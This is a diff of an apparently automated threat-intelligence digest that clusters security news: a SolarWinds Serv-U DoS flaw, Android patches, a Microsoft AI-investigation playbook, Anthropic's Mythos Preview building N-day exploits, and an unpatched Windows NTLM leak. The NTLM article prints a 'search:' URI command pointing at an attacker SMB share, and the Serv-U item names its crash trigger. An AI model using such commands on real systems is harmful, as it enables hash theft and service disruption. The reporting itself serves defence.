 - affected_industries: government
-- affected_products: SolarWinds, Microsoft SharePoint, Palo Alto Networks
-- cve_ids: CVE-2026-28318, CVE-2024-21182, CVE-2026-0257, CVE-2026-39987, CVE-2026-45659
-- urgency_signals: actively_exploited, zero_day
+- affected_products: SolarWinds, GitHub, Microsoft 365
+- cve_ids: CVE-2026-28318, CVE-2026-11645, CVE-2026-20230, CVE-2026-23479
+- urgency_signals: actively_exploited, zero_day, no_patch_yet
 - content_type: news_report
 - confidence_tier: tier_4_news
 
@@ -1783,7 +1757,7 @@ The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a hig
 #### Full body
 
 ```
-CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog  Ravie Lakshmanan  Jun 06, 2026 Vulnerability / Patch Management The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash under certain conditions. CISA described it as an uncontrolled resource consumption vulnerability that results in a DoS condition. "SolarWinds Serv-U is susceptible to specially crafted POST requests that crash the Serv-U service without authentication using Content-Encoding: deflate," SolarWinds said in an advisory released earlier this week. The issue has been addressed in SolarWinds Serv-U version 15.5.4 HF1. As mitigations, it's advised to limit access to known addresses and block any request containing "content-encoding" since the vulnerable service does not require this functionality. There are currently no details on how the vulnerability is being exploited in real-world attacks, or who is behind them. It's also unclear how many internet-exposed Serv-U instances are compromised, if any. CISA has ordered Federal Civilian Executive Branch (FCEB) agencies to address the flaw by June 19, 2026. In the past, multiple flaws in Serv-U have been exploited by bad actors, including those associated with the Cl0p ransomware gang . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , denial of service , KEV Catalog , Patch Management , ransomware , Serv-U , SolarWinds , Vulnerability ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastructure AI Chatbot Recommendations Redirect Users to Cryptojacking Malware Sites Microsoft Patches SharePoint RCE Flaw CVE-2026-45659 Across Server Versions ⭐ Featured Resources Your Employees Are Using AI in Ways You Can’t See – 2026 State of AI Report Learn How to Stop Attacks Before They Reach Your EDR – With PHASR Watch AI Turn Vulnerabilities Into Working Exploits in Minutes (See the Demo) [Guide] The Real Security Risks of Shadow AI (And Where You’re Exposed)
+CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog  Ravie Lakshmanan  Jun 06, 2026 Vulnerability / Patch Management The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash under certain conditions. CISA described it as an uncontrolled resource consumption vulnerability that results in a DoS condition. "SolarWinds Serv-U is susceptible to specially crafted POST requests that crash the Serv-U service without authentication using Content-Encoding: deflate," SolarWinds said in an advisory released earlier this week. The issue has been addressed in SolarWinds Serv-U version 15.5.4 HF1. As mitigations, it's advised to limit access to known addresses and block any request containing "content-encoding" since the vulnerable service does not require this functionality. There are currently no details on how the vulnerability is being exploited in real-world attacks, or who is behind them. It's also unclear how many internet-exposed Serv-U instances are compromised, if any. CISA has ordered Federal Civilian Executive Branch (FCEB) agencies to address the flaw by June 19, 2026. In the past, multiple flaws in Serv-U have been exploited by bad actors, including those associated with the Cl0p ransomware gang . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , denial of service , KEV Catalog , Patch Management , ransomware , Serv-U , SolarWinds , Vulnerability ⚡ Top Stories This Week Chrome V8 Zero-Day CVE-2026-11645 Exploited in the Wild - Patch Now New FROST Attack Lets Websites Track What Sites and Apps You Open via SSD Timing One-Character Linux Kernel Flaw Enables Local Root Access, Exploits Now Public ⚡ Weekly Recap: Instagram Account Hacks, Android Zero-Day, GitHub Worm and More New ChatGPT Lockdown Mode Limits Tools That Could Enable Data Exfiltration Free Apps Are Quietly Turning Smart TVs Into Web-Scraping Proxies for AI AI Agent Uncovers 21 Zero-Days in FFmpeg; Chrome Patches Record 429 Bugs Miasma Worm Hits 73 Microsoft GitHub Repositories in Major Supply Chain Attack Cisco Patches CVE-2026-20230 in Unified CM as Exploit Code Goes Public Claude Code GitHub Action Flaw Let One Malicious Issue Hijack Repositories Microsoft Fixes One-Click GitHub Dev Attack That Let Attackers Steal OAuth Tokens Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479) Microsoft 365 Android Apps Let Any App Steal Account Tokens via Leftover Debug Flag Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes New HTTP/2 Bomb Vulnerability Allows Remote DoS on NGINX, Apache, IIS, Envoy and Cloudflare ThreatsDay Bulletin: AI Agents Gone Wrong, Sketchy C2 Tools, ClickFix Tricks, JS Backdoors + 20 New Stories ⭐ Featured Resources Get the 2026 Guide to Govern and Secure Enterprise AI Agents at Scale Catch 88% of Malware Threats in Under 60 Seconds with Live Sandbox Analysis [Guide] Transform Network Operations with Intelligent Workflows See How Agentic AI Cuts Your SOC Triage Time in Half [Get a Demo]
 ```
 
 #### Corroborating sources (1)
@@ -1794,54 +1768,58 @@ CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog  Ravie
   - Link: https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
   - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash
 
-### Cluster a8a021acdc — score 18
+### Cluster e002a0d5e1 — score 18
 
-- Title: Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-06-02T18:46:00+00:00
-- Link: https://thehackernews.com/2026/06/google-june-2026-android-update-patches.html
+- Title: Reconstructing AI activity in investigations
+- Source: Microsoft Security Blog (threat_research_primary)
+- Published: 2026-06-09T17:35:06+00:00
+- Link: https://www.microsoft.com/en-us/security/blog/2026/06/09/reconstructing-ai-activity-investigations/
 - Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2025-48595
+- Member count: 3
+- Corroborating source count: 3
+- Strong signals: Azure, Microsoft 365
 
 #### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, cryptojacking, mfa_bypass, phishing_social_eng, supply_chain, zero_day
-- affected_industries: government
-- affected_products: GitHub, Microsoft SharePoint, Palo Alto Networks
-- cve_ids: CVE-2024-21182, CVE-2025-48595, CVE-2026-0257, CVE-2026-39987, CVE-2026-45659
-- urgency_signals: actively_exploited, zero_day
+- threat_categories: ai_security, data_breach, phishing_social_eng
+- affected_products: Anthropic/Claude, Azure, GitHub, Microsoft 365
 - content_type: news_report
-- confidence_tier: tier_4_news
+- confidence_tier: tier_1_primary_research, tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: supply_chain, phishing_social_eng, zero_day, cryptojacking, mfa_bypass, active_exploitation
-- affected_industries: government
-- affected_products: Microsoft SharePoint, Palo Alto Networks, GitHub
-- cve_ids: CVE-2025-48595, CVE-2024-21182, CVE-2026-0257, CVE-2026-39987, CVE-2026-45659
-- urgency_signals: actively_exploited, zero_day
+- threat_categories: phishing_social_eng, data_breach, ai_security
+- affected_products: Anthropic/Claude, GitHub, Azure
 - content_type: news_report
-- confidence_tier: tier_4_news
+- confidence_tier: tier_1_primary_research
 
 #### Summary
 
 ```
-Google on Monday released patches for 124 security vulnerabilities impacting its Android operating system for the month of June 2026, including one high-severity flaw in the Framework component that has come under active exploitation. Tracked as CVE-2025-48595 (CVSS score: 8.4), the security flaw has been described as a case of privilege escalation without requiring any user interaction. The
+Learn how to investigate AI activity in Microsoft 365 Copilot and Azure AI services using a structured, telemetry-driven approach. This playbook helps security teams reconstruct events, assess data exposure, and detect potential threats faster. The post Reconstructing AI activity in investigations appeared first on Microsoft Security Blog .
 ```
 
 #### Full body
 
 ```
-Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited  Ravie Lakshmanan  Jun 02, 2026 Vulnerability / Mobile Security Google on Monday released patches for 124 security vulnerabilities impacting its Android operating system for the month of June 2026, including one high-severity flaw in the Framework component that has come under active exploitation. Tracked as CVE-2025-48595 (CVSS score: 8.4), the security flaw has been described as a case of privilege escalation without requiring any user interaction. The vulnerability impacts devices running Android versions 14, 15, 16, and 16 QPR2 (Quarterly Platform Release 2). "In multiple locations, there is a possible way to achieve code execution due to an integer overflow," according to a description of the vulnerability on CVE.org. "This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation." Google has acknowledged there are indications that CVE-2025-48595 may be under "limited, targeted exploitation." As is typically the case, the tech giant did not reveal any specifics about who may have been behind the activity, the targets affected, and the scale of such efforts. That said, similar flaws have been weaponized by commercial spyware vendors to target high-profile individuals as part of extremely targeted attacks. Elsewhere, a number of vulnerabilities have been patched in the System component, the most severe of which could lead to local escalation of privilege with no additional execution privileges needed. Google has released two sets of patches - 2026-06-01 and 2026-06-05 security patch levels - with the latter including all fixes from the first set, along with patches for kernel and third-party chipset components from Imagination Technologies, MediaTek, Qualcomm, and Unisoc. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on June 2, 2026, added CVE-2025-48595 to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to remediate the flaw by June 5, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Android , cybersecurity , Google , mobile security , operating system , privilege escalation , Threat Intelligence , Vulnerability ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastructure AI Chatbot Recommendations Redirect Users to Cryptojacking Malware Sites Microsoft Patches SharePoint RCE Flaw CVE-2026-45659 Across Server Versions ⭐ Featured Resources Your Employees Are Using AI in Ways You Can’t See – 2026 State of AI Report Learn How to Stop Attacks Before They Reach Your EDR – With PHASR Watch AI Turn Vulnerabilities Into Working Exploits in M
+Share Link copied to clipboard! Content types Research Topics Actionable threat insights AI and agents AI systems are now part of everyday work. Investigators need a consistent way to reconstruct what happened within them. Security teams are already investigating activity involving Microsoft 365 Copilot and Azure AI services—from prompt injection attempts to unexpected data access. Those signals are observable. Without structure, they do not form a coherent account of what occurred. AI interactions generate telemetry across Microsoft Purview, Defender, and Sentinel. That telemetry captures who initiated an interaction, when it occurred, and which resources were involved. It provides the foundation for reconstructing AI activity in enterprise environments. It’s turning those signals into an investigation. To help address that challenge, we’ve published a new investigator playbook for Microsoft 365 Copilot and Azure AI services. The playbook provides a structured approach for investigating AI-related activity using the telemetry already available across Microsoft security products. The methodology follows a scope–context–signal sequence. Investigations begin by identifying who interacted with AI systems, when the activity occurred, and which services were involved. From there, investigators expand into resource context: what the system accessed, what data may have been exposed, and how that activity aligns with expected behavior. Detection signals, including prompt injection attempts, anomalous usage patterns, or credential exposure alerts, are then evaluated within that broader chain of activity. AI telemetry is constructed metadata-first, providing identity, time, and resource context across interactions. That structure is what moves investigations from isolated signals to a coherent account of what occurred. When analyzed together, those elements allow investigators to establish what happened, understand the impact, and determine whether activity reflects normal usage, policy violations, or indicators of compromise. The playbook operationalizes this approach across Microsoft 365 Copilot and Azure AI services. It brings together the required configuration, queries, and detection patterns into a single working model — covering schema references, KQL queries, and detection logic — enabling investigators to follow AI activity across tools with fewer ad hoc pivots. It also extends that model to agent-based systems, where the investigative picture expands: which agents are deployed, how they are configured, what data they are authorized to access, and whether that authorization was used as expected. The outcome is practical. Response teams can move from isolated signals to a reconstructed account of observed activity: scoping AI usage, understanding what data was accessed during interactions, and assessing whether observed behavior is consistent with normal usage, policy violations, or indicators of active threat conditions across Microsoft security services. As AI becomes part of everyday business workflows, response teams need the same investigative rigor they apply to endpoints, identities, and cloud infrastructure. The ability to determine what happened, what data was involved, and whether activity was authorized is quickly becoming a core incident response capability. The playbook gives you the tools to answer it. Download it here: https://aka.ms/AIIRplaybook Related posts June 8 17 min read AI brands as bait: How threat actors are using the AI hype in social engineering As threat actors operationalize AI to accelerate attacks, they are also leveraging the wider global interest around AI itself as a social engineering lure. June 5 10 min read Securing CI/CD in an agentic world: Claude Code Github action case Microsoft Threat Intelligence identified a prompt injection pathway in Claude Code GitHub Action that allowed access to workflow secrets under specific conditions. June 4 6 min read Updating the taxonomy of failure modes i
 ```
 
-#### Corroborating sources (1)
+#### Corroborating sources (3)
 
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited
-  - Published: 2026-06-02T18:46:00+00:00
-  - Link: https://thehackernews.com/2026/06/google-june-2026-android-update-patches.html
-  - Summary: Google on Monday released patches for 124 security vulnerabilities impacting its Android operating system for the month of June 2026, including one high-severity flaw in the Framework component that has come under active exploitation. Tracked as CVE-2025-48595 (CVSS score: 8.4), the security flaw has been described as a case of privilege escalation without requiring any user interaction. The
+- **Microsoft Security Blog** (threat_research_primary)
+  - Title: Reconstructing AI activity in investigations
+  - Published: 2026-06-09T17:35:06+00:00
+  - Link: https://www.microsoft.com/en-us/security/blog/2026/06/09/reconstructing-ai-activity-investigations/
+  - Summary: Learn how to investigate AI activity in Microsoft 365 Copilot and Azure AI services using a structured, telemetry-driven approach. This playbook helps security teams reconstruct events, assess data exposure, and detect potential threats faster. The post Reconstructing AI activity in investigations appeared first on Microsoft Security Blog .
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: GitHub disables Microsoft repos pushing password-stealing malware
+  - Published: 2026-06-09T15:42:40+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/github-disables-microsoft-repos-pushing-password-stealing-malware/
+  - Summary: Microsoft removed 73 repositories across its Azure, microsoft, Azure-Samples, and MicrosoftDocs organizations on GitHub, disrupting continuous integration pipelines. [...]
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: Coding Gaffe Exposes Microsoft 365 Accounts to Widespread Takeover
+  - Published: 2026-06-03T19:00:41+00:00
+  - Link: https://www.darkreading.com/application-security/coding-gaffe-exposes-microsoft-365-accounts-takeover
+  - Summary: A disabled security setting meant to protect authentication across Android versions of key apps like Word, PowerPoint, and Excel paved the way for attackers to steal logins and data.
 
 ### Cluster 5e7c345e11 — score 18
 
@@ -1850,8 +1828,8 @@ Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited  Ra
 - Published: 2026-06-09T09:19:53+00:00
 - Link: https://www.helpnetsecurity.com/2026/06/09/anthropic-mythos-preview-n-day-exploits-firefox-windows/
 - Fetch status: ok
-- Member count: 8
-- Corroborating source count: 6
+- Member count: 9
+- Corroborating source count: 7
 - Strong signals: Anthropic/Claude
 
 #### Cluster taxonomy (union across members)
@@ -1881,7 +1859,7 @@ Mythos Preview can develop working exploits from newly disclosed software vulner
 Sinisa Markovic , Managing Editor, Help Net Security June 9, 2026 Share Mythos Preview can weaponize N-day vulnerabilities in hours Mythos Preview can develop working exploits from newly disclosed software vulnerabilities in hours, cutting down a process that has historically taken days or weeks, according to Anthropic. Anthropic’s recent cybersecurity research has largely focused on zero-days , vulnerabilities unknown to software vendors. The new study examines N-days, vulnerabilities that have already been disclosed and patched but remain present on unpatched systems. “In some ways, N-days are the more dangerous of the two, because the patch itself provides a roadmap to the bug,” Anthropic researchers wrote . Once vendors release security updates, attackers can compare patched and unpatched versions of software to identify what changed and reverse-engineer the underlying vulnerability, a technique known as patch diffing. “It’s not surprising that today’s language models can produce N-day exploits. Given enough time and a good enough harness, this has likely been possible for a while,” the researchers noted. “But with models like Mythos Preview, what has changed is the volume of findings and the speed with which they can be produced. A lone operator can now turn a month’s worth of patches into working exploits in a single afternoon—for a few thousand dollars and with no specialized expertise,” they added. The study included two evaluations to measure how well AI models could turn recently patched vulnerabilities into working exploits. The first focused on Firefox , where researchers analyzed 18 security patches affecting SpiderMonkey, Firefox’s JavaScript engine. Firefox was chosen because it represents a relatively favorable environment for defenders, Anthropic said. Mythos Preview autonomously developed eight working code-execution exploits from the 18 Firefox patches. The model produced its first exploit within an hour of the patch becoming available. The researchers noted that the Firefox release containing the fix was still 18 days away, highlighting the gap between exploit development and patch deployment. The second evaluation examined 21 Windows kernel vulnerabilities disclosed between January and February 2026. Unlike Firefox, the Windows tests involved closed-source software, requiring the model to work from patched binaries, decompiler output and public vulnerability information. Researchers described this as a substantially harder task because source code was unavailable. In testing against 21 Windows kernel vulnerabilities, Mythos Preview developed proof-of-concept (PoC) exploits for 18 vulnerabilities, triggering a Blue Screen of Death in each case. The model later generated eight exploit chains that elevated a low-privileged user to SYSTEM-level access. It produced its first proof-of-concept in 31 minutes and generated all 18 within six hours. Anthropic estimates that Mythos generated its eight Windows privilege-escalation exploits for about $15,700 in API credits, or roughly $2,000 per exploit. Anthropic also found that several publicly available Claude models were capable of developing exploits in testing, although they achieved lower success rates than Mythos Preview. The findings come as Anthropic plans to make Mythos-class models available to all customers once additional cyber safeguards are in place. The researchers argued that exploit-development timelines have shortened to the point where the term “N-day” may no longer accurately reflect the threat. “N-day has become dangerously misleading. N-hour is closer to the reality we now operate in,” the researchers concluded. More about Anthropic cybersecurity vulnerability disclosure Share
 ```
 
-#### Corroborating sources (6)
+#### Corroborating sources (7)
 
 - **Help Net Security** (cyber_news_breach_reporting)
   - Title: Mythos Preview can weaponize N-day vulnerabilities in hours
@@ -1898,6 +1876,11 @@ Sinisa Markovic , Managing Editor, Help Net Security June 9, 2026 Share Mythos P
   - Published: 2026-06-08T17:06:53+00:00
   - Link: https://www.schneier.com/blog/archives/2026/06/critical-zcash-vulnerability-found-and-fixed.html
   - Summary: If you’re a user—owner?—of this cryptocurrency, this is important: On May 29, the security researcher Taylor Hornby found a critical vulnerability in Zcash Orchard privacy pool using Claude Opus 4.8. The Zcash team hired Hornby specifically to look for this kind of issue. He found one fast enough to be embarrassing. The Orchard pool is the newest and most advanced shielded transaction system in the cryptocurrency Zcash. Introduced in 2022, it allows users to send and receive ZEC while keeping transaction details private. It uses zero-knowledge proofs to validate transactions without revealing amounts or participants. The bug: a specific check that was supposed to validate transaction inputs wasn’t actually enforcing the rules it appeared to enforce. An attacker could have exploited the flaw to feed false inputs into that check and generate ZEC from nothing, with the zero-knowledge proof system blessing the fraudulent transaction as valid...
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: XBOW tests Anthropic's Mythos Preview for offensive security
+  - Published: 2026-06-09T16:16:38+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/xbow-tests-anthropics-mythos-preview-for-offensive-security/
+  - Summary: Anthropic's Mythos Preview was highly effective at finding vulnerability candidates, especially when analyzing source code. XBOW explores how the model performed across exploit discovery, reverse engineering, and live-site validation. [...]
 - **SecurityWeek** (cyber_news_breach_reporting)
   - Title: Claude Mythos Turns N-Days Into N-Hours With Rapid Exploit Creation
   - Published: 2026-06-09T15:03:13+00:00
@@ -1926,17 +1909,17 @@ Sinisa Markovic , Managing Editor, Help Net Security June 9, 2026 Share Mythos P
 - Strong signals: CVE-2026-33829
 
 #### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, mfa_bypass, phishing_social_eng, supply_chain, zero_day
-- affected_products: GitHub, OpenAI/ChatGPT, Palo Alto Networks
-- cve_ids: CVE-2023-35636, CVE-2024-21182, CVE-2026-0257, CVE-2026-33829, CVE-2026-39987
+- threat_categories: active_exploitation, supply_chain, zero_day
+- affected_products: Android, GitHub, Microsoft 365
+- cve_ids: CVE-2023-35636, CVE-2026-11645, CVE-2026-20230, CVE-2026-23479, CVE-2026-33829
 - urgency_signals: actively_exploited, no_patch_yet, zero_day
 - content_type: vulnerability_disclosure
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: supply_chain, phishing_social_eng, zero_day, mfa_bypass, active_exploitation
-- affected_products: Palo Alto Networks, GitHub, OpenAI/ChatGPT
-- cve_ids: CVE-2026-33829, CVE-2023-35636, CVE-2024-21182, CVE-2026-0257, CVE-2026-39987
+- threat_categories: supply_chain, zero_day, active_exploitation
+- affected_products: GitHub, Microsoft 365, Android
+- cve_ids: CVE-2026-33829, CVE-2023-35636, CVE-2026-11645, CVE-2026-20230, CVE-2026-23479
 - urgency_signals: actively_exploited, zero_day, no_patch_yet
 - content_type: vulnerability_disclosure
 - confidence_tier: tier_4_news
@@ -1950,7 +1933,7 @@ Cybersecurity researchers have disclosed details of an unpatched issue that coul
 #### Full body
 
 ```
-Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes  Ravie Lakshmanan  Jun 03, 2026 Vulnerability / Network Security Cybersecurity researchers have disclosed details of an unpatched issue that could be exploited to disclose a user's NTLMv2 hash to the attacker. Like in the case of CVE-2026-33829 , which impacted the Windows Snipping Tool's ms-screensketch: URI handler, the newly flagged issue resides in the search: URI handler, per Huntress . CVE-2026-33829 refers to a spoofing vulnerability that could expose sensitive information to an unauthorized actor. It was patched by Microsoft in April 2026. "An attacker could induce the user into clicking a specially crafted link in a Web browser or other URL source, by embedding it in a Web page or email message," Microsoft noted in its advisory at the time. "If the user approves the launching of the link, the crafted URL can induce the computer to connect to an SMB server of the attacker's choosing, which would disclose the user's NTLMv2 hash to the attacker, who could use this to authenticate as the user." Specifically, the problem had to do with the fact that the Snipping Tool's URI handler accepted a "filePath" parameter, failed to validate it, and would reach out to any Universal Naming Convention (UNC) path passed to it. This, in turn, could trigger NTLM authentication and expose the victim's Net-NTLMv2 hash to the attacker. The newly discovered shortcoming achieves the same end goal using "search:" and "crumb=location:" instead of "filePath" using a command like below - start "" "search:query=test&crumb=location:\\10.0.1.100\share" "It used the same NTLM leakage mechanism, produced the same Net-NTLMv2 leak, had the same prerequisites, and carried the same Moderate rating," Huntress researcher Andrew Schwartz said. It's worth noting that the use of a "crumb" parameter to steal the hash ( CVE-2023-35636 ) was documented by Varonis in February 2024. As a result, a threat actor could leverage the captured hash to conduct relay attacks and gain deeper access into a network. Following responsible disclosure on April 15, 2026, Microsoft declined to address the issue, stating "only Important and Critical severity cases meet our bar for servicing." In the absence of a fix, it's advised to block outbound SMB (TCP/445 and TCP/139) on hosts that don't need it, enforce SMB signing so that captured hashes can't be relayed against internal services, and disable NTLM where applicable. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Authentication , cybersecurity , Microsoft , network security , NTLM , Relay attack , SMB , Threat Research , Vulnerability , Windows Security ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastruc
+Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes  Ravie Lakshmanan  Jun 03, 2026 Vulnerability / Network Security Cybersecurity researchers have disclosed details of an unpatched issue that could be exploited to disclose a user's NTLMv2 hash to the attacker. Like in the case of CVE-2026-33829 , which impacted the Windows Snipping Tool's ms-screensketch: URI handler, the newly flagged issue resides in the search: URI handler, per Huntress . CVE-2026-33829 refers to a spoofing vulnerability that could expose sensitive information to an unauthorized actor. It was patched by Microsoft in April 2026. "An attacker could induce the user into clicking a specially crafted link in a Web browser or other URL source, by embedding it in a Web page or email message," Microsoft noted in its advisory at the time. "If the user approves the launching of the link, the crafted URL can induce the computer to connect to an SMB server of the attacker's choosing, which would disclose the user's NTLMv2 hash to the attacker, who could use this to authenticate as the user." Specifically, the problem had to do with the fact that the Snipping Tool's URI handler accepted a "filePath" parameter, failed to validate it, and would reach out to any Universal Naming Convention (UNC) path passed to it. This, in turn, could trigger NTLM authentication and expose the victim's Net-NTLMv2 hash to the attacker. The newly discovered shortcoming achieves the same end goal using "search:" and "crumb=location:" instead of "filePath" using a command like below - start "" "search:query=test&crumb=location:\\10.0.1.100\share" "It used the same NTLM leakage mechanism, produced the same Net-NTLMv2 leak, had the same prerequisites, and carried the same Moderate rating," Huntress researcher Andrew Schwartz said. It's worth noting that the use of a "crumb" parameter to steal the hash ( CVE-2023-35636 ) was documented by Varonis in February 2024. As a result, a threat actor could leverage the captured hash to conduct relay attacks and gain deeper access into a network. Following responsible disclosure on April 15, 2026, Microsoft declined to address the issue, stating "only Important and Critical severity cases meet our bar for servicing." In the absence of a fix, it's advised to block outbound SMB (TCP/445 and TCP/139) on hosts that don't need it, enforce SMB signing so that captured hashes can't be relayed against internal services, and disable NTLM where applicable. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Authentication , cybersecurity , Microsoft , network security , NTLM , Relay attack , SMB , Threat Research , Vulnerability , Windows Security ⚡ Top Stories This Week Chrome V8 Zero-Day CVE-2026-11645 Exploited in the Wild - Patch Now New FROST Attack Lets Websites Track What Sites and Apps You Open via SSD Timing One-Character Linux Kernel Flaw Enables Local Root Access, Exploits Now Public ⚡ Weekly Recap: Instagram Account Hacks, Android Zero-Day, GitHub Worm and More New ChatGPT Lockdown Mode Limits Tools That Could Enable Data Exfiltration Free Apps Are Quietly Turning Smart TVs Into Web-Scraping Proxies for AI AI Agent Uncovers 21 Zero-Days in FFmpeg; Chrome Patches Record 429 Bugs Miasma Worm Hits 73 Microsoft GitHub Repositories in Major Supply Chain Attack Cisco Patches CVE-2026-20230 in Unified CM as Exploit Code Goes Public Claude Code GitHub Action Flaw Let One Malicious Issue Hijack Repositories Microsoft Fixes One-Click GitHub Dev Attack That Let Attackers Steal OAuth Tokens Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479) Microsoft 365 Android Apps Let Any App Steal Account Tokens via Leftover Debug Flag Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes New HTTP/2 Bomb Vulnerability Allows Remote DoS on NGINX, Apache, IIS, Envoy and Cloudflare ThreatsD
 ```
 
 #### Corroborating sources (1)
@@ -1961,14 +1944,14 @@ Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes �
   - Link: https://thehackernews.com/2026/06/unpatched-windows-search-uri.html
